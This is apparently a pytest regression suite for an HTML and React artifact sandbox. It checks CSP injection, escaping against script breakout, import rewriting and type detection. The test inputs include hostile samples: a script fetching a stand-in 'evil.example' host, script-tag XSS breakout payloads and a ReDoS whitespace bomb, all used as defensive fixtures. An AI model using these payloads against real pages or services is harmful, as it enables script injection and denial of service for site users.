"""Regression tests for sandbox.py — no GTK required.

Run:  python3 -m pytest tests/ -v
Each test guards a bug found during the 2026-11 security audit.
"""
import os
import sys
import time

import pytest

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
import sandbox  # noqa: E402


@pytest.fixture
def vendor_dir(tmp_path):
    """Fake vendor libraries so build_srcdoc('react', ...) can run."""
    names = sandbox.BASE_FILES + [
        "prop-types.min.js", "Recharts.js", "lucide-react.min.js",
        "lodash.min.js", "d3.min.js", "math.js", "papaparse.min.js",
    ]
    for name in names:
        (tmp_path / name).write_text("/* stub lib */", encoding="utf-8")
    return str(tmp_path)


# --- CSP injection: the critical bypass from the first audit ---

def test_csp_comment_bypass_closed():
    doc = "<!doctype html>\n<!-- <head> -->\n<script>fetch('https://evil.example')</script>"
    out = sandbox.inject_head(doc)
    assert sandbox.CSP_META in out
    assert out.index(sandbox.CSP_META) < out.index("<!--")  # CSP outside the comment


def test_csp_textarea_bypass_closed():
    doc = "<!doctype html><html><textarea><head></textarea><script>1</script>"
    out = sandbox.inject_head(doc)
    assert out.index(sandbox.CSP_META) < out.index("<textarea")


def test_csp_prepended_when_no_doctype():
    doc = "<html><head><title>t</title></head><body>x</body></html>"
    assert sandbox.inject_head(doc).startswith(sandbox.CSP_META)


def test_doctype_stays_first_standards_mode():
    # Step 1 regression: prepending CSP before the doctype forced quirks mode.
    doc = "<!DOCTYPE html><html><head></head><body>hi</body></html>"
    out = sandbox.inject_head(doc)
    assert out.startswith("<!DOCTYPE html>")
    assert out.index(sandbox.CSP_META) < out.index("<html")


def test_html_fragment_gets_csp(vendor_dir):
    out = sandbox.build_srcdoc("html", "<div>hi</div>", vendor_dir)
    assert sandbox.CSP_META in out


def test_csp_policy_sanity():
    assert "connect-src 'none'" in sandbox.CSP
    assert "frame-src 'none'" in sandbox.CSP


# --- script-tag breakout prevention ---

def test_esc_script_breakout():
    out = sandbox.esc_script("</script><img src=x onerror=alert(1)>")
    assert "</script" not in out.lower()
    assert "<\\/script" in out


def test_esc_script_case_insensitive():
    assert "</script" not in sandbox.esc_script("</ScRiPt>").lower()


def test_js_artifact_cannot_break_wrapper(vendor_dir):
    code = 'var s = "</script><script>alert(1)</script>";'
    out = sandbox.build_srcdoc("js", code, vendor_dir)
    assert out.lower().count("</script>") == 1  # only the real closing tag


def test_warn_module_name_cannot_break_wrapper(vendor_dir):
    # Step 1 regression: msg.replace("</", "</") was a no-op.
    payload = "</script><script>window.__pwned=1</script>"
    code = "import x from '" + payload + "'\nexport default function App(){return null}"
    out = sandbox.build_srcdoc("react", code, vendor_dir)
    assert "Not available offline" in out
    assert "</script><script>window.__pwned" not in out


# --- import rewriting: correctness + the ReDoS fix ---

def test_import_basic():
    code = "import { useState } from 'react';\nexport default function App(){return null}"
    out, extra, missing = sandbox.prepare_react(code)
    assert "const {useState} = window.React;" in out
    assert missing == []


def test_import_multiline_still_works():
    # Step 1 regression: bounded regex must not break multi-line imports.
    code = ("import {\n  LineChart, Line, XAxis, YAxis\n} from 'recharts';\n"
            "export default function App(){return null}")
    out, extra, missing = sandbox.prepare_react(code)
    assert "const {LineChart, Line, XAxis, YAxis} = window.Recharts;" in out
    assert extra == ["prop-types.min.js", "Recharts.js"]


def test_import_alias():
    code = "import { Foo as Bar } from 'lucide-react';\nexport default function App(){return null}"
    out, _extra, _missing = sandbox.prepare_react(code)
    assert "const {Foo: Bar} = window.LucideReact;" in out


def test_import_unknown_module_stubbed():
    code = "import confetti from 'canvas-confetti';\nexport default function App(){return null}"
    out, _extra, missing = sandbox.prepare_react(code)
    assert missing == ["canvas-confetti"]
    assert 'window.__stub("canvas-confetti")' in out


def test_import_whitespace_bomb_is_fast():
    # Step 1 regression: unbounded quantifiers froze the UI on this input.
    bomb = "import" + " " * 300_000 + "\nexport default function App(){return null}"
    t0 = time.perf_counter()
    sandbox.needed_files("react", bomb)
    assert time.perf_counter() - t0 < 2.0


# --- type detection and helpers ---

def test_detect_full_html():
    assert sandbox.detect_type("<!DOCTYPE html><html><body>x</body></html>", "a.html") == "html"


def test_detect_jsx_is_react():
    assert sandbox.detect_type("export default function App(){return <div/>}", "a.jsx") == "react"


def test_detect_plain_js():
    assert sandbox.detect_type("const x = 1;", "a.js") == "js"


def test_detect_html_fragment():
    assert sandbox.detect_type("<div>hi</div>", "a.txt") == "html"


def test_needed_files_react_with_recharts():
    code = "import { Line } from 'recharts';\nexport default function App(){return null}"
    needed = sandbox.needed_files("react", code)
    assert set(sandbox.BASE_FILES) <= set(needed)
    assert "Recharts.js" in needed


def test_needed_files_html_empty():
    assert sandbox.needed_files("html", "<div>x</div>") == []


def test_notice_page_escapes_html():
    out = sandbox.notice_page("<script>alert(1)</script>")
    assert "<script>" not in out
    assert "&lt;script>" in out
